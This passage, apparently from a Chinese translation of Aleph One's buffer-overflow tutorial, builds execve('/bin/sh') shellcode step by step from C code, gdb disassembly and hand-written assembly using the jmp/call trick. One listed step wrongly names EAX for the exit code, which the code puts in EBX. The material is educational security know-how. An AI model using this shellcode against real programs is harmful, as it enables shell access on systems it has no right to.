&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|____________________________|

堆栈顶部&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 堆栈底部

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp; 派生出一个shell的C语言代码是这样的:

&nbsp;&nbsp;

shellcode.c

-----------------------------------------------------------------------------

#include &lt;stdio.h&gt;

void main() {

&nbsp; &nbsp;char *name[2];

&nbsp; &nbsp;name[0] = "/bin/sh";

&nbsp; &nbsp;name[1] = NULL;

&nbsp; &nbsp;execve(name[0], name, NULL);

}

------------------------------------------------------------------------------

&nbsp; &nbsp; 为了查明这程序变成汇编后是个什么样子, 我们编译它, 然后祭出调试工具gdb. 记住

在编译的时候要使用-static标志, 否则系统调用execve的真实代码就不会包括在汇编中,

取而代之的是对动态C语言库的一个引用, 真正的代码要到程序加载的时候才会联入.

------------------------------------------------------------------------------
  
[aleph1]$ gcc -o shellcode -ggdb -static shellcode.c
  
[aleph1]$ gdb shellcode

GDB is free software and you are welcome to distribute copies of it

under certain conditions; type "show copying" to see the conditions.

There is absolutely no warranty for GDB; type "show warranty" for details.

GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...

(gdb) disassemble main

Dump of assembler code for function main:

0x8000130 &lt;main&gt;:&nbsp; &nbsp;&nbsp; &nbsp; pushl&nbsp;&nbsp;%ebp

0x8000131 &lt;main+1&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esp,%ebp

0x8000133 &lt;main+3&gt;:&nbsp; &nbsp;&nbsp;&nbsp;subl&nbsp; &nbsp;$0x8,%esp

0x8000136 &lt;main+6&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x80027b8,0xfffffff8(%ebp)

0x800013d &lt;main+13&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x0,0xfffffffc(%ebp)

0x8000144 &lt;main+20&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;$0x0

0x8000146 &lt;main+22&gt;:&nbsp; &nbsp; leal&nbsp; &nbsp;0xfffffff8(%ebp),%eax

0x8000149 &lt;main+25&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;%eax

0x800014a &lt;main+26&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;0xfffffff8(%ebp),%eax

0x800014d &lt;main+29&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;%eax

0x800014e &lt;main+30&gt;:&nbsp; &nbsp; call&nbsp; &nbsp;0x80002bc &lt;__execve&gt;

0x8000153 &lt;main+35&gt;:&nbsp; &nbsp; addl&nbsp; &nbsp;$0xc,%esp

0x8000156 &lt;main+38&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;%ebp,%esp

0x8000158 &lt;main+40&gt;:&nbsp; &nbsp; popl&nbsp; &nbsp;%ebp

0x8000159 &lt;main+41&gt;:&nbsp; &nbsp; ret

End of assembler dump.

(gdb) disassemble __execve

Dump of assembler code for function __execve:

0x80002bc &lt;__execve&gt;:&nbsp; &nbsp;pushl&nbsp;&nbsp;%ebp

0x80002bd &lt;__execve+1&gt;: movl&nbsp; &nbsp;%esp,%ebp

0x80002bf &lt;__execve+3&gt;: pushl&nbsp;&nbsp;%ebx

0x80002c0 &lt;__execve+4&gt;: movl&nbsp; &nbsp;$0xb,%eax

0x80002c5 &lt;__execve+9&gt;: movl&nbsp; &nbsp;0x8(%ebp),%ebx

0x80002c8 &lt;__execve+12&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;0xc(%ebp),%ecx

0x80002cb &lt;__execve+15&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;0x10(%ebp),%edx

0x80002ce &lt;__execve+18&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80

0x80002d0 &lt;__execve+20&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%eax,%edx

0x80002d2 &lt;__execve+22&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;testl&nbsp;&nbsp;%edx,%edx

0x80002d4 &lt;__execve+24&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;jnl&nbsp; &nbsp; 0x80002e6 &lt;__execve+42&gt;

0x80002d6 &lt;__execve+26&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;negl&nbsp; &nbsp;%edx

0x80002d8 &lt;__execve+28&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;pushl&nbsp;&nbsp;%edx

0x80002d9 &lt;__execve+29&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call&nbsp; &nbsp;0x8001a34 &lt;__normal_errno_location&gt;

0x80002de &lt;__execve+34&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%edx

0x80002df &lt;__execve+35&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%edx,(%eax)

0x80002e1 &lt;__execve+37&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0xffffffff,%eax

0x80002e6 &lt;__execve+42&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%ebx

0x80002e7 &lt;__execve+43&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%ebp,%esp

0x80002e9 &lt;__execve+45&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%ebp

0x80002ea &lt;__execve+46&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;ret

0x80002eb &lt;__execve+47&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;nop

End of assembler dump.

------------------------------------------------------------------------------

&nbsp; &nbsp; 下面我们看看这里究竟发生了什么事情. 先从main开始研究:

&nbsp; &nbsp; 

------------------------------------------------------------------------------

0x8000130 &lt;main&gt;:&nbsp; &nbsp;&nbsp; &nbsp; pushl&nbsp;&nbsp;%ebp

0x8000131 &lt;main+1&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esp,%ebp

0x8000133 &lt;main+3&gt;:&nbsp; &nbsp;&nbsp;&nbsp;subl&nbsp; &nbsp;$0x8,%esp

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;这是例程的准备工作. 首先保存老的帧指针, 用当前的堆栈指针作为新的帧指针,

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;然后为局部变量保留空间. 这里是:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;char *name[2];

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;即2个指向字符串的指针. 指针的长度是一个字, 所以这里保留2个字(8个字节)的

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;空间.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x8000136 &lt;main+6&gt;:&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x80027b8,0xfffffff8(%ebp)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;我们把0x80027b8(字串"/bin/sh"的地址)这个值复制到name[]中的第一个指针, 这

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;等价于:&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;name[0] = "/bin/sh";

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x800013d &lt;main+13&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x0,0xfffffffc(%ebp)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp; 

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;我们把值0x0(NULL)复制到name[]中的第二个指针, 这等价于:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;name[1] = NULL;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;对execve()的真正调用从下面开始:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x8000144 &lt;main+20&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;$0x0

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;我们把execve()的参数以从后向前的顺序压入堆栈中, 这里从NULL开始.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x8000146 &lt;main+22&gt;:&nbsp; &nbsp; leal&nbsp; &nbsp;0xfffffff8(%ebp),%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;把name[]的地址放到EAX寄存器中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x8000149 &lt;main+25&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;接着就把name[]的地址压入堆栈中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x800014a &lt;main+26&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;0xfffffff8(%ebp),%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;把字串"/bin/sh"的地址放到EAX寄存器中

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x800014d &lt;main+29&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;接着就把字串"/bin/sh"的地址压入堆栈中

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x800014e &lt;main+30&gt;:&nbsp; &nbsp; call&nbsp; &nbsp;0x80002bc &lt;__execve&gt;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;调用库例程execve(). 这个调用指令把IP(指令指针)压入堆栈中.

------------------------------------------------------------------------------

&nbsp; &nbsp; 现在到了execve(). 要注意我们使用的是基于Intel的Linux系统. 系统调用的细节随

操作系统和CPU的不同而不同. 有的把参数压入堆栈中, 有的保存在寄存器里. 有的使用

软中断跳入内核模式, 有的使用远调用(far call). Linux把传给系统调用的参数保存在

寄存器里, 并且使用软中断跳入内核模式.&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

------------------------------------------------------------------------------

0x80002bc &lt;__execve&gt;:&nbsp; &nbsp;pushl&nbsp;&nbsp;%ebp

0x80002bd &lt;__execve+1&gt;: movl&nbsp; &nbsp;%esp,%ebp

0x80002bf &lt;__execve+3&gt;: pushl&nbsp;&nbsp;%ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;例程的准备工作.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x80002c0 &lt;__execve+4&gt;: movl&nbsp; &nbsp;$0xb,%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;把0xb(十进制的11)放入寄存器EAX中(原文误为堆栈). 0xb是系统调用表的索引

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;11就是execve.

0x80002c5 &lt;__execve+9&gt;: movl&nbsp; &nbsp;0x8(%ebp),%ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;把"/bin/sh"的地址放到寄存器EBX中.

0x80002c8 &lt;__execve+12&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;0xc(%ebp),%ecx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;把name[]的地址放到寄存器ECX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

0x80002cb &lt;__execve+15&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;0x10(%ebp),%edx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;把空指针的地址放到寄存器EDX中.

0x80002ce &lt;__execve+18&gt;:&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;进入内核模式.

------------------------------------------------------------------------------&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;

&nbsp; &nbsp; 由此可见调用execve()也没有什么太多的工作要做, 所有要做的事情总结如下:

&nbsp; &nbsp; 

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;a) 把以NULL结尾的字串"/bin/sh"放到内存某处.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;b) 把字串"/bin/sh"的地址放到内存某处, 后面跟一个空的长字(null long word)

.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;c) 把0xb放到寄存器EAX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;d) 把字串"/bin/sh"的地址放到寄存器EBX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;e) 把字串"/bin/sh"地址的地址放到寄存器ECX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;(注: 原文d和e步骤把EBX和ECX弄反了)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;f) 把空长字的地址放到寄存器EDX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;g) 执行指令int $0x80. 

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp; 但是如果execve()调用由于某种原因失败了怎么办? 程序会继续从堆栈中读取指令, 

这时的堆栈中可能含有随机的数据! 程序执行这样的指令十有八九会core dump. 如果execv

e

调用失败我们还是希望程序能够干净地退出. 为此必须在调用execve之后加入一个exit

系统调用. exit系统调用在汇编语言看起来象什么呢?

exit.c

------------------------------------------------------------------------------

#include &lt;stdlib.h&gt;

void main() {

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;exit(0);

}

------------------------------------------------------------------------------

------------------------------------------------------------------------------
  
[aleph1]$ gcc -o exit -static exit.c
  
[aleph1]$ gdb exit

GDB is free software and you are welcome to distribute copies of it

under certain conditions; type "show copying" to see the conditions.

There is absolutely no warranty for GDB; type "show warranty" for details.

GDB 4.15 (i586-unknown-linux), Copyright 1995 Free Software Foundation, Inc...

(no debugging symbols found)...

(gdb) disassemble _exit

Dump of assembler code for function _exit:

0x800034c &lt;_exit&gt;:&nbsp; &nbsp;&nbsp; &nbsp;pushl&nbsp;&nbsp;%ebp

0x800034d &lt;_exit+1&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;%esp,%ebp

0x800034f &lt;_exit+3&gt;:&nbsp; &nbsp; pushl&nbsp;&nbsp;%ebx

0x8000350 &lt;_exit+4&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;$0x1,%eax

0x8000355 &lt;_exit+9&gt;:&nbsp; &nbsp; movl&nbsp; &nbsp;0x8(%ebp),%ebx

0x8000358 &lt;_exit+12&gt;:&nbsp; &nbsp;int&nbsp; &nbsp; $0x80

0x800035a &lt;_exit+14&gt;:&nbsp; &nbsp;movl&nbsp; &nbsp;0xfffffffc(%ebp),%ebx

0x800035d &lt;_exit+17&gt;:&nbsp; &nbsp;movl&nbsp; &nbsp;%ebp,%esp

0x800035f &lt;_exit+19&gt;:&nbsp; &nbsp;popl&nbsp; &nbsp;%ebp

0x8000360 &lt;_exit+20&gt;:&nbsp; &nbsp;ret

0x8000361 &lt;_exit+21&gt;:&nbsp; &nbsp;nop

0x8000362 &lt;_exit+22&gt;:&nbsp; &nbsp;nop

0x8000363 &lt;_exit+23&gt;:&nbsp; &nbsp;nop

End of assembler dump.

------------------------------------------------------------------------------

&nbsp; &nbsp; 系统调用exit会把0x1放到寄存器EAX中, 在EBX中放置退出码, 并且执行"int 0x80".

就这些了! 大多数应用程序在退出时返回0, 以表示没有错误. 我们在EBX中也放入0. 现

在我们构造shell code的步骤就是这样的了:

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;a) 把以NULL结尾的字串"/bin/sh"放到内存某处.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;b) 把字串"/bin/sh"的地址放到内存某处, 后面跟一个空的长字(null long word)

.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;c) 把0xb放到寄存器EAX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;d) 把字串"/bin/sh"的地址放到寄存器EBX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;e) 把字串"/bin/sh"地址的地址放到寄存器ECX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;(注: 原文d和e步骤把EBX和ECX弄反了)

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;f) 把空长字的地址放到寄存器EDX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;g) 执行指令int $0x80.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;h) 把0x1放到寄存器EAX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;i) 把0x0放到寄存器EAX中.

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;j) 执行指令int $0x80.&nbsp;&nbsp;

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;

&nbsp; &nbsp; 试着把这些步骤变成汇编语言, 把字串放到代码后面. 别忘了在数组后面放上字串

 地址和空字, 我们有如下的代码:

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;string_addr,string_addr_addr

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0x0,null_byte_addr

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0,null_addr

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0xb,%eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;string_addr,%ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;string_addr,%ecx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;null_string,%edx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x1, %eax

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0, %ebx

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;/bin/sh string goes here.

------------------------------------------------------------------------------

&nbsp; &nbsp; 问题是我们不知道在要破解的程序的内存空间中, 上述代码(和其后的字串)会被放到

哪里. 一种解决方法是使用JMP和CALL指令. JMP和CALL指令使用相对IP的寻址方式, 也就

是说我们可以跳到距离当前IP一定间距的某个位置, 而不必知道那个位置在内存中的确切

地址. 如果我们在字串"/bin/sh"之前放一个CALL指令, 并由一个JMP指令转到CALL指令上.

当CALL指令执行的时候, 字串的地址会被作为返回地址压入堆栈之中. 我们所需要的就是

把返回地址放到一个寄存器之中. CALL指令只是调用我们上述的代码就可以了. 假定J代

表JMP指令, C代表CALL指令, s代表字串, 执行过程如下所示:

内存低&nbsp; &nbsp;&nbsp;&nbsp;DDDDDDDDEEEEEEEEEEEE&nbsp;&nbsp;EEEE&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp;&nbsp;FFFF&nbsp; &nbsp;&nbsp;&nbsp;内存高

地址&nbsp; &nbsp;&nbsp; &nbsp; 89ABCDEF0123456789AB&nbsp;&nbsp;CDEF&nbsp;&nbsp;0123&nbsp;&nbsp;4567&nbsp;&nbsp;89AB&nbsp;&nbsp;CDEF&nbsp; &nbsp;&nbsp;&nbsp;地址

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;buffer&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; sfp&nbsp; &nbsp;ret&nbsp; &nbsp;a&nbsp; &nbsp;&nbsp;&nbsp;b&nbsp; &nbsp;&nbsp;&nbsp;c

&lt;------&nbsp; &nbsp;[JJSSSSSSSSSSSSSSCCss][ssss][0xD8][0x01][0x02][0x03]

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;^|^&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; ^|&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;|

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;|||_____________||____________| (1)

&nbsp; &nbsp;&nbsp; &nbsp; (2)&nbsp;&nbsp;||_____________||

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; |______________| (3)

堆栈顶部&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;堆栈底部

&nbsp; &nbsp; 运用上述的修正方法, 并使用相对索引寻址, 我们代码中每条指令的字节数目如下:

&nbsp; &nbsp; 

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;jmp&nbsp; &nbsp; offset-to-call&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%esi&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 1 byte

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,array-offset(%esi)&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0x0,nullbyteoffset(%esi)# 4 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0,null-offset(%esi)&nbsp; &nbsp;# 7 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0xb,%eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,%ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;array-offset(%esi),%ecx&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;leal&nbsp; &nbsp;null-offset(%esi),%edx&nbsp; &nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x1, %eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0, %ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;int&nbsp; &nbsp; $0x80&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;call&nbsp; &nbsp;offset-to-popl&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;/bin/sh string goes here.

------------------------------------------------------------------------------

&nbsp;&nbsp;

&nbsp; &nbsp; 通过计算从jmp到call, 从call到popl, 从字串地址到数组, 从字串地址到空长字的

偏量, 我们得到:

------------------------------------------------------------------------------

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;jmp&nbsp; &nbsp; 0x26&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 2 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;popl&nbsp; &nbsp;%esi&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;# 1 byte

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,0x8(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 3 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movb&nbsp; &nbsp;$0x0,0x7(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 4 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0x0,0xc(%esi)&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;# 7 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;$0xb,%eax&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 5 bytes

&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;&nbsp;movl&nbsp; &nbsp;%esi,%ebx&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp; # 2 bytes

